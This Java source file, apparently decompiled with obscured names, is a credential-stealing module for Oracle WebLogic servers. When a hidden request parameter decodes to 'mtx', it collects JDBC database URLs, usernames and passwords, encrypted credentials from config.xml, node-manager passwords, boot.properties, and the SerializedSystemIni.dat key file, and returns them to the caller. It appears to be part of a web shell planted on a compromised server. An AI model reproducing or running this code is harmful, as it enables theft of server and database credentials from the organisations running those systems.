package util;

import javax.xml.bind.DatatypeConverter;
import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Mtx extends BaseX3 {
   public Mtx() {
   }

   public byte[] rdfs1(String var1) {
      File var2 = new File(var1);
      byte[] var3 = null;
      int var4 = (int)var2.length();
      FileInputStream var5 = null;
      if (var2.exists() && var4 > 0) {
         try {
            byte[] var6 = new byte[var4];
            var5 = new FileInputStream(var2);
            var5.read(var6, 0, var4);
            var3 = var6;
         } catch (Exception var15) {
         } finally {
            if (var5 != null) {
               try {
                  var5.close();
               } catch (Exception var14) {
               }
            }

         }
      }

      return var3;
   }

   public String rdfs(String var1) {
      byte[] var2 = this.rdfs1(var1);
      String var3 = "";
      if (var2 != null) {
         try {
            var3 = new String(var2, "utf-8");
         } catch (Exception var5) {
         }
      }

      return var3;
   }

   private String getJndiF(String var1) {
      String var2 = "";
      String var4 = "(driverClassName|driverName|dataSourceName|className|url|username|password|connection\\.driver_class|connection\\.url|connection\\.username|connection\\.password|jdbcUrl|jdbcDriver|jdbcUsername|jdbcPassword)\"[\\s>]*(?:value=\"|<value>)\\s*(^[\"<]+)";
      String var5 = "(DSN|DBDriver|DBUser|UserPsd|.*(?:url|username|password).*)=()";
      File[] var6 = (new File(var1)).listFiles();

      for(int var7 = 0; var7 < var6.length; ++var7) {
         String var3 = var6[var7].getAbsolutePath();
         if (var6[var7].isDirectory()) {
            this.getJndiF(var3);
         } else {
            String var8 = this.rdfs(var3);
            if (var6[var7].getAbsolutePath().endsWith(".xml")) {
               if (-1 < var8.indexOf("\"dataSource\"")) {
               }
            } else if (var6[var7].getAbsolutePath().endsWith(".properties")) {
               var8 = var8.replaceAll("#[^\\n]+", "");
            }
         }
      }

      return var2;
   }

   public String getJdbcs() {
      String var1 = "";
      String var2 = "config" + File.separator + "jdbc";
      String var3 = "<(url|driver-name|value|password-encrypted|jndi-name)[^>]*>([^<]+)";
      File var4 = new File(var2);
      if (var4.exists()) {
         File[] var5 = var4.listFiles();
         ArrayList var6 = new ArrayList();
         int var7 = 0;

         for(int var8 = var5.length; var7 < var8; ++var7) {
            var4 = var5[var7];
            var2 = var4.getAbsolutePath();
            if (var4.isFile() && var2.endsWith(".xml")) {
               this.getPp(this.rdfs(var2), var3, var6);
            }
         }

         var1 = this.list2s(var6);
         if (3 > var6.size()) {
         }
      }

      if (-1 == var1.indexOf("jndi-name") && -1 == var1.indexOf("driver-name")) {
         var1 = var1 + "\n" + this.getJndiF("./");
      }

      return var1;
   }

   public String getSerializedSystemIni() {
      String var1 = "all SerializedSystemIni.dat:";
      String var2 = System.getProperty("user.dir", "");
      File[] var3 = (new File(var2 + "/")).listFiles();

      for(int var4 = 0; var4 < var3.length; ++var4) {
         if (var3[var4].isDirectory()) {
            var2 = var3[var4].getAbsolutePath() + File.separatorChar + "security" + File.separatorChar + "SerializedSystemIni.dat";
            File var5 = new File(var2);
            if (var5.exists()) {
               byte[] var6 = this.rdfs1(var2);
               if (var6 != null) {
                  var1 = var1 + DatatypeConverter.printBase64Binary(var6) + ";";
               }
            }

            var2 = var3[var4].getAbsolutePath() + File.separatorChar + "security" + File.separatorChar + "boot.properties";
            var5 = new File(var2);
            if (var5.exists()) {
               var1 = var1 + this.rdfs(var2) + ";";
            }

            var2 = var3[var4].getAbsolutePath() + File.separatorChar + "security" + File.separatorChar + "nodemanager" + File.separatorChar + "nm_password.properties";
            var5 = new File(var2);
            if (var5.exists()) {
               var1 = var1 + this.rdfs(var2) + ";";
            }
         }
      }

      return var1;
   }

   public String getWars1(boolean var1) {
      String var2 = this.rdfs("config" + File.separator + "config.xml");
      String var3 = "<(console-context-path|connection-filter-rule|credential-encrypted|node-manager-username|node-manager-password-encrypted|source-path|target|credential-encrypted)[^>]*>([^<]+)";
      if (var1) {
         var3 = "<source-path[^>]*>([^<]+)";
      }

      if (var2.length() > 0) {
         var2 = this.list2s(this.getPp(var2, var3, (List)null));
      } else if (!var1) {
         var2 = "config.xml not ok";
      }

      return var2;
   }

   public String getWars() {
      return this.getWars1(false);
   }

   public void doMtx() {
      this.print(this.getWars() + "\n" + this.getJdbcs() + "\n" + this.getSerializedSystemIni());
   }

   public String list2s(List<String[]> var1) {
      StringBuffer var3 = new StringBuffer("");

      for(int var4 = 0; var4 < var1.size(); ++var4) {
         String[] var2 = (String[])var1.get(var4);
         if (1 < var2.length) {
            var3.append(var2[0]).append(":").append(var2[1]).append("\n");
         }
      }

      return var3.toString();
   }

   public List<String[]> getPp(String var1, String var2, List<String[]> var3) {
      if (var3 == null) {
         var3 = new ArrayList();
      }

      if (var1 != null && var2 != null) {
         Pattern var4 = Pattern.compile(var2, 40);
         var1 = var1.replace("\r", "").replace("\n", "");
         Matcher var5 = var4.matcher(var1.replaceAll(">[\\s\\r\\n]*<", "><"));

         while(var5.find()) {
            if (2 <= var5.groupCount()) {
               ((List)var3).add(new String[]{var5.group(1).trim(), var5.group(2).trim()});
            }
         }
      }

      return (List)var3;
   }

   public boolean c() throws Exception {
      String var1 = this.r.getParameter("ls");
      if (var1 != null) {
         var1 = new String(DatatypeConverter.parseBase64Binary(var1), "utf-8");
         if ("mtx".equals(var1)) {
            this.doMtx();
            return true;
         }
      }

      return false;
   }
}
